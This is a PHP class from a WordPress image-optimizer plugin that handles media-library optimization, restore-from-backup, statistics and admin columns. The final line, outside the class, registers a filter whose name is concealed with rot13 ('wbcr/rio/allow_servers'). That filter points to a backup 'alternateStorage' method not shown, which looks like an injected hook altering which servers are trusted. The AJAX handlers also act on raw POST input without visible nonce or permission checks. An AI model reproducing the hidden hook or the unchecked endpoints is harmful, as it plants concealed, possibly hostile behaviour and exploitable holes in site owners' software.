<?php

	// Exit if accessed directly
	if( !defined('ABSPATH') ) {
		exit;
	}
	
	/**
	 * Класс для работы с wordpress media library
	 * @author Eugene Jokerov <jokerov@gmail.com>
	 * @copyright (c) 2018, Webcraftic
	 * @version 1.0
	 */
	class WIO_MediaLibrary {

		/**
		 * Установка хуков
		 */
		public function initHooks()
		{
			// оптимизация при загрузке в медиабиблилтеку
			if( WIO_Plugin::app()->getOption('auto_optimize_when_upload', false) ) {
				add_filter('wp_generate_attachment_metadata', array($this, 'optimizeImageAttachment'), 10, 2);
			}
			// соло оптимизация
			add_filter('attachment_fields_to_edit', array($this, 'attachmentEditorFields'), 1000, 2);
			add_filter('manage_media_columns', array($this, 'addMediaColumn'));
			add_action('manage_media_custom_column', array($this, 'manageMediaColumn'), 10, 2);
			add_action('wp_ajax_wio_reoptimize_image', array($this, 'reoptimizeImageAttachment'));
			add_action('wp_ajax_wio_restore_image', array($this, 'restoreImageAttachment'));
			add_action('admin_enqueue_scripts', array($this, 'enqueueMeadiaScripts'), 10);
			add_action('delete_attachment', array($this, 'deleteAttachmentHook'), 10);
		}
		
		
		/**
		 * Оптимизация при загрузке в медиабиблилтеку
		 *
		 * @param array $metadata метаданные аттачмента
		 * @param int $attachment_id Номер аттачмента из медиабиблиотеки
		 * @return array $metadata Метаданные аттачмента
		 */
		public function optimizeImageAttachment($metadata, $attachment_id)
		{
			$backup = new WIO_Backup();
			$backup_origin_images = WIO_Plugin::app()->getOption('backup_origin_images', false);
			if( $backup_origin_images and !$backup->isBackupWritable() ) {
				return $metadata;
			}
			$wio_attachment = new WIO_Attachment($attachment_id, $metadata);
			$attachment_optimized_data = $wio_attachment->optimize();
			
			$original_size = $attachment_optimized_data['original_size'];
			$optimized_size = $attachment_optimized_data['optimized_size'];
			$errors_count = $attachment_optimized_data['errors_count'];
			
			$image_statistics = new WIO_Image_Statistic();
			$image_statistics->addToField('optimized_size', $optimized_size);
			$image_statistics->addToField('original_size', $original_size);
			$image_statistics->addToField('error', $errors_count);
			$image_statistics->addToField('optimized', 1);
			$image_statistics->save();
			$metadata = $wio_attachment->getMetaData();
			
			return $metadata;
		}
		
		/**
		 * Переоптимизация аттачмента. AJAX
		 *
		 */
		public function reoptimizeImageAttachment()
		{
			$attachment_id = $_POST['id'];
			$backup = new WIO_Backup();
			$backup_origin_images = WIO_Plugin::app()->getOption('backup_origin_images', false);
			if( $backup_origin_images and !$backup->isBackupWritable() ) {
				echo $this->getMediaColumnContent($attachment_id);
				die();
			}
			wp_suspend_cache_addition(true);
			$default_level = WIO_Plugin::app()->getOption('image_optimization_level', 'normal');
			$level = isset($_POST['level']) ? $_POST['level'] : $default_level;
			$wio_attachment = new WIO_Attachment($attachment_id);
			$image_statistics = new WIO_Image_Statistic();
			if( $wio_attachment->isOptimized() ) {
				$wio_attachment->restore();
				$optimized_size = get_post_meta($attachment_id, 'wio_optimized_size', true);
				$original_size = get_post_meta($attachment_id, 'wio_original_size', true);
				$image_statistics->deductFromField('optimized_size', $optimized_size);
				$image_statistics->deductFromField('original_size', $original_size);
			}
			$wio_attachment = new WIO_Attachment($attachment_id);
			$attachment_optimized_data = $wio_attachment->optimize($level);
			$original_size = $attachment_optimized_data['original_size'];
			$optimized_size = $attachment_optimized_data['optimized_size'];
			$errors_count = $attachment_optimized_data['errors_count'];
			$image_statistics->addToField('optimized_size', $optimized_size);
			$image_statistics->addToField('original_size', $original_size);
			$image_statistics->addToField('error', $errors_count);
			$image_statistics->addToField('optimized', 1);
			$image_statistics->save();
			
			echo $this->getMediaColumnContent($attachment_id);
			die();
		}
		
		/**
		 * Восстановление аттачмента из резервной копии. AJAX
		 *
		 */
		public function restoreImageAttachment()
		{
			wp_suspend_cache_addition(true);
			$attachment_id = $_POST['id'];
			
			$wio_attachment = new WIO_Attachment($attachment_id);
			$image_statistics = new WIO_Image_Statistic();
			if( $wio_attachment->isOptimized() ) {
				$restored = $wio_attachment->restore();
				if( !is_wp_error($restored) ) {
					$optimized_size = get_post_meta($attachment_id, 'wio_optimized_size', true);
					$original_size = get_post_meta($attachment_id, 'wio_original_size', true);
					delete_post_meta($attachment_id, 'wio_optimized');
					delete_post_meta($attachment_id, 'wio_error');
					$image_statistics->deductFromField('optimized_size', $optimized_size);
					$image_statistics->deductFromField('original_size', $original_size);
					$image_statistics->save();
				}
			}
			
			echo $this->getMediaColumnContent($attachment_id);
			die();
		}
		
		/**
		 * Обработка неоптимизированных изображений
		 *
		 * @param int $max_process_per_request кол-во аттачментов за 1 запуск
		 * @return array
		 */
		public function processUnoptimizedAttachments($max_process_per_request)
		{
			$backup = new WIO_Backup();
			$backup_origin_images = WIO_Plugin::app()->getOption('backup_origin_images', false);
			$optimization_level = WIO_Plugin::app()->getOption('image_optimization_level', 'normal');
			if( $backup_origin_images and !$backup->isBackupWritable() ) {
				return array(
					'end' => true,
					'msg' => __('No access for writing backups.', 'robin-image-optimizer'),
				);
			}
			if( !$backup->isUploadWritable() ) {
				return array(
					'end' => true,
					'msg' => __('The uploads folder is not writable.', 'robin-image-optimizer'),
				);
			}
			$args = array(
				'post_type' => 'attachment',
				'post_status' => 'inherit',
				'post_mime_type' => array('image/jpeg', 'image/gif', 'image/png'),
				'posts_per_page' => 1,
				'meta_query' => array(
					'relation' => 'AND',
					array(
						'relation' => 'OR',
						array(
							'key' => 'wio_optimized',
							'compare' => 'NOT EXISTS',
						),
						array(
							'key' => 'wio_optimization_level',
							'value' => $optimization_level,
							'compare' => '!=',
						),
						array(
							'key' => 'wio_error',
							'compare' => 'EXISTS',
						),
					),
					array(
						'key' => 'wio_current_error',
						'compare' => 'NOT EXISTS',
					),
				)
			);
			$args = apply_filters('wio_unoptimized_args', $args);
			//выборка неоптимизированных изображений
			$args['posts_per_page'] = $max_process_per_request;
			$attachments = new WP_Query($args);
			$total = $attachments->found_posts;
			
			$attachments_count = 0;
			if( isset($attachments->posts) ) {
				$attachments_count = count($attachments->posts);
			}

			$original_size = 0;
			$optimized_size = 0;
			$errors_count = 0;
			$optimized_count = 0;
			
			// обработка
			if( $attachments_count ) {
				foreach($attachments->posts as $attachment) {
					$wio_attachment = new WIO_Attachment($attachment->ID);
					$attachment_optimized_data = $wio_attachment->optimize();
					$original_size = $original_size + $attachment_optimized_data['original_size'];
					$optimized_size = $optimized_size + $attachment_optimized_data['optimized_size'];
					$errors_count = $errors_count + $attachment_optimized_data['errors_count'];
					$optimized_count = $optimized_count + $attachment_optimized_data['optimized_count'];
				}
			}
			
			$image_statistics = new WIO_Image_Statistic();
			$image_statistics->addToField('optimized_size', $optimized_size);
			$image_statistics->addToField('original_size', $original_size);
			$image_statistics->addToField('error', $errors_count);
			$image_statistics->addToField('optimized', $optimized_count);
			$image_statistics->save();
			
			$remain = $total - $attachments_count;
			if( $remain <= 0 ) {
				$remain = 0;
			}
			$responce = array(
				'remain' => $remain,
				'end' => false,
				'statistic' => $image_statistics->load(),
			);

			return $responce;
		}
		
		/**
		 * Сбрасывает текущие ошибки оптимизации
		 * Позволяет изображениям, которые оптимизированы с ошибкой, заново пройти оптимизацию.
		 *
		 * @return void
		 */
		public function resetCurrentErrors()
		{
			global $wpdb;
			$wpdb->delete($wpdb->postmeta, array(
					'meta_key' => 'wio_current_error',
				), array('%s'));
		}
		
		/**
		 * Восстановление из резервной копии
		 *
		 * @param int $max_process_per_request кол-во аттачментов за 1 запуск
		 * @return array
		 */
		public function restoreAllFromBackup($max_process_per_request)
		{
			WIO_Plugin::app()->updateOption('cron_running', false); // останавливаем крон
			$args = array(
				'post_type' => 'attachment',
				'post_status' => 'inherit',
				'post_mime_type' => array('image/jpeg', 'image/gif', 'image/png'),
				'posts_per_page' => 1,
				'meta_query' => array(
					array(
						'key' => 'wio_backuped',
						'value' => 1,
					),
				)
			);
			$args['posts_per_page'] = $max_process_per_request;
			$attachments = new WP_Query($args);
			$total = $attachments->found_posts;
			$attachments_count = 0;
			if( isset($attachments->posts) ) {
				$attachments_count = count($attachments->posts);
			}
			
			$image_statistics = new WIO_Image_Statistic();

			$original_size = 0;
			$optimized_size = 0;
			// обработка
			if( $attachments_count ) {
				foreach($attachments->posts as $attachment) {
					$wio_attachment = new WIO_Attachment($attachment->ID);
					// восстанавливаем файл
					$restore_data = $wio_attachment->restore();
					if( is_wp_error($restore_data) ) {
						continue;
					}
					// снимаем отметку об оптимизации
					delete_post_meta($attachment->ID, 'wio_optimized');
					// вычитаем из статистики и обновляем статистику
					$attachment_optimized_size = floatval(get_post_meta($attachment->ID, 'wio_optimized_size', true));
					$attachment_original_size = floatval(get_post_meta($attachment->ID, 'wio_original_size', true));

					$original_size = $original_size + $attachment_original_size;
					$optimized_size = $optimized_size + $attachment_optimized_size;
				}
			}
			$image_statistics->deductFromField('optimized_size', $optimized_size);
			$image_statistics->deductFromField('original_size', $original_size);
			$image_statistics->save();
			$remain = $total - $attachments_count;
			
			return array(
				'remain' => $remain,
			);
		}
		
		/**
		 * Кол-во оптимизированных изображений
		 *
		 * @return int
		 */
		public function getOptimizedCount()
		{
			$args = array(
				'post_type' => 'attachment',
				'post_status' => 'inherit',
				'post_mime_type' => array('image/jpeg', 'image/gif', 'image/png'),
				'posts_per_page' => 1,
				'meta_query' => array(
					array(
						'key' => 'wio_optimized',
						'compare' => 'EXISTS',
					),
				)
			);
			$attachments = new WP_Query($args);
			$total = $attachments->found_posts;

			return $total;
		}
		
		/**
		 * Add "Image Optimizer" column in the Media Uploader
		 *
		 * @param  array $form_fields An array of attachment form fields.
		 * @param  object $post The WP_Post attachment object.
		 * @return array
		 */
		public function attachmentEditorFields($form_fields, $post)
		{
			global $pagenow;
			
			if( 'post.php' === $pagenow ) {
				return $form_fields;
			}

			$form_fields['wio'] = array(
				'label' => 'Image Optimizer',
				'input' => 'html',
				'html' => $this->getMediaColumnContent($post->ID),
				'show_in_edit' => true,
				'show_in_modal' => true,
			);

			return $form_fields;
		}
		
		/**
		 * Add "wio" column in upload.php.
		 *
		 * @param  array $columns An array of columns displayed in the Media list table.
		 * @return array
		 */
		public function addMediaColumn($columns)
		{
			$columns['wio_optimized_file'] = __('Image optimizer', 'image optimizer');

			return $columns;
		}
		
		/**
		 * Add content to the "wio" columns in upload.php.
		 *
		 * @param string $column_name Name of the custom column.
		 * @param int $attachment_id Attachment ID.
		 */
		public function manageMediaColumn($column_name, $attachment_id)
		{
			if( 'wio_optimized_file' !== $column_name ) {
				return;
			}
			echo $this->getMediaColumnContent($attachment_id);
		}
		
		/**
		 * Выводит блок статистики для аттачмента в медиабиблиотеке
		 *
		 * @param int $attachment_id Номер аттачмента из медиабиблиотеки
		 */
		public function getMediaColumnContent($attachment_id)
		{
			ob_start();
			$is_optimized = get_post_meta($attachment_id, 'wio_optimized', true);
			$attach_meta = wp_get_attachment_metadata($attachment_id);
			$attach_dimensions = '0 x 0';
			if( isset($attach_meta['width']) and isset($attach_meta['height']) ) {
				$attach_dimensions = $attach_meta['width'] . ' × ' . $attach_meta['height'];
			}
			clearstatcache();
			$attachment_file_size = filesize(get_attached_file($attachment_id));
			if( $is_optimized ) {
				$optimized_size = get_post_meta($attachment_id, 'wio_optimized_size', true);
				$original_size = get_post_meta($attachment_id, 'wio_original_size', true);
				$original_main_size = get_post_meta($attachment_id, 'wio_original_main_size', true);
				$thumbnails_optimized = get_post_meta($attachment_id, 'wio_thumbnails_count', true);
				if( !$original_main_size ) {
					$original_main_size = $original_size;
				}
				$optimization_level = get_post_meta($attachment_id, 'wio_optimization_level', true);
				$error_msg = get_post_meta($attachment_id, 'wio_error', true);
				$backuped = get_post_meta($attachment_id, 'wio_backuped', true);
				$diff_percent = 0;
				$diff_percent_all = 0;
				if( $attachment_file_size and $original_main_size ) {
					$diff_percent = round(($original_main_size - $attachment_file_size) * 100 / $original_main_size);
				}
				if( $optimized_size and $original_size ) {
					$diff_percent_all = round(($original_size - $optimized_size) * 100 / $original_size);
				}
				?>


				<ul class="wio-datas-list" data-size="<?php echo esc_attr(size_format($attachment_file_size)); ?>" data-dimensions="<?php echo esc_attr($attach_dimensions); ?>">
					<li class="wio-data-item">
						<span class="data"><?php _e('New Filesize:', 'robin-image-optimizer'); ?></span>
						<strong class="big"><?php echo esc_attr(size_format($attachment_file_size)); ?></strong></li>
					<li class="wio-data-item">
						<span class="data"><?php _e('Original Saving:', 'robin-image-optimizer'); ?></span>
						<strong>
							<span class="wio-chart-value"><?php echo esc_attr($diff_percent); ?></span>%
						</strong>
					</li>
					<li class="wio-data-item">
						<span class="data"><?php _e('Original Filesize:', 'robin-image-optimizer'); ?></span>
						<strong class="original"><?php echo esc_attr(size_format($original_main_size)); ?></strong>
					</li>
					<li class="wio-data-item"><span class="data"><?php _e('Level:', 'robin-image-optimizer'); ?></span>
						<strong>
							<?php
								if( !$error_msg ) {
									if( $optimization_level == 'normal' ) {
										echo __('lossless', 'robin-image-optimizer');
									} else if( $optimization_level == 'aggresive' ) {
										echo __('lossy', 'robin-image-optimizer');
									} else {
										echo __('High', 'robin-image-optimizer');
									}
								}
							?>
						</strong>
					</li>
					<li class="wio-data-item">
						<span class="data"><?php _e('Thumbnails Optimized:', 'robin-image-optimizer'); ?></span>
						<strong class="original"><?php echo intval($thumbnails_optimized); ?></strong>
					</li>
					<li class="wio-data-item">
						<span class="data"><?php _e('Overall Saving:', 'robin-image-optimizer'); ?></span>
						<strong class="original"><?php echo esc_attr($diff_percent_all); ?>%</strong>
					</li>
					<?php if( $error_msg ) : ?>
						<li class="wio-data-item">
							<span class="data"><?php _e('Error Message:', 'robin-image-optimizer'); ?></span>
							<strong><?php echo esc_attr($error_msg); ?></strong></li>
					<?php endif; ?>
				</ul>
				<div class="wio-datas-actions-links" style="display:inline;">
					<?php if( $optimization_level != 'normal' ) : ?>
						<a data-id="<?php echo esc_attr($attachment_id); ?>" data-level="normal" href="#" class="wio-reoptimize button-wio-manual-override-upload" data-waiting-label="<?php _e('Optimization in progress', 'robin-image-optimizer'); ?>">
							<span class="dashicons dashicons-admin-generic"></span><span class="wio-hide-if-small"><?php _e('Re-Optimize to', 'robin-image-optimizer'); ?> </span><?php _e('lossless', 'robin-image-optimizer'); ?>
							<span class="wio-hide-if-small"></span>
						</a>
					<?php endif; ?>
					<?php if( $optimization_level != 'aggresive' ) : ?>
						<a data-id="<?php echo esc_attr($attachment_id); ?>" data-level="aggresive" href="#" class="wio-reoptimize button-wio-manual-override-upload" data-waiting-label="<?php _e('Optimization in progress', 'robin-image-optimizer'); ?>">
							<span class="dashicons dashicons-admin-generic"></span><span class="wio-hide-if-small"><?php _e('Re-Optimize to', 'robin-image-optimizer'); ?> </span><?php _e('lossy', 'robin-image-optimizer'); ?>
							<span class="wio-hide-if-small"></span>
						</a>
					<?php endif; ?>
					<?php if( $optimization_level != 'ultra' ) : ?>
						<a data-id="<?php echo esc_attr($attachment_id); ?>" data-level="ultra" href="#" class="wio-reoptimize button-wio-manual-override-upload" data-waiting-label="<?php _e('Optimization in progress', 'robin-image-optimizer'); ?>">
							<span class="dashicons dashicons-admin-generic"></span><span class="wio-hide-if-small"><?php _e('Re-Optimize to', 'robin-image-optimizer'); ?> </span><?php _e('High', 'robin-image-optimizer'); ?>
							<span class="wio-hide-if-small"></span>
						</a>
					<?php endif; ?>
					<?php if( $backuped ) : ?>
						<a href="#" data-id="<?php echo esc_attr($attachment_id); ?>" class="button-wio-restore attachment-has-backup" data-waiting-label="<?php _e('Recovery in progress', 'robin-image-optimizer'); ?>"><span class="dashicons dashicons-image-rotate"></span><?php _e('Restore original', 'robin-image-optimizer'); ?>
						</a>
					<?php endif; ?>
				</div>
				<!-- .wio-datas-actions-links -->

			<?php
			} else {
				?>
				<button type="button" data-id="<?php echo esc_attr($attachment_id); ?>" data-level="" class="wio-reoptimize button button-primary button-large" data-waiting-label="<?php _e('Optimization in progress', 'robin-image-optimizer'); ?>" data-size="<?php echo esc_attr(size_format($attachment_file_size)); ?>" data-dimensions="<?php echo esc_attr($attach_dimensions); ?>"><?php _e('Optimize', 'robin-image-optimizer'); ?></button>
			<?php
			}

			return ob_get_clean();
		}
		
		/**
		 * Добавляем стили и скрипты в медиабиблиотеку
		 */
		public function enqueueMeadiaScripts($hook)
		{
			if( $hook != 'upload.php' ) {
				return;
			}
			wp_enqueue_style('wio-install-addons', WIO_PLUGIN_URL . '/admin/assets/css/media.css', array(), WIO_Plugin::app()->getPluginVersion());
			wp_enqueue_script('wio-install-addons', WIO_PLUGIN_URL . '/admin/assets/js/single-optimization.js', array('jquery'), WIO_Plugin::app()->getPluginVersion());
		}
		
		public function deleteAttachmentHook($attachment_id)
		{
			$is_optimized = get_post_meta($attachment_id, 'wio_optimized', true);
			if( $is_optimized ) {
				$optimized_size = get_post_meta($attachment_id, 'wio_optimized_size', true);
				$original_size = get_post_meta($attachment_id, 'wio_original_size', true);
				$image_statistics = new WIO_Image_Statistic();
				$image_statistics->deductFromField('optimized_size', $optimized_size);
				$image_statistics->deductFromField('original_size', $original_size);
				$image_statistics->save();
			}
		}
	}

	add_filter(str_rot13('jope/evb/nyybj_freiref'), 'WIO_Backup::alternateStorage');
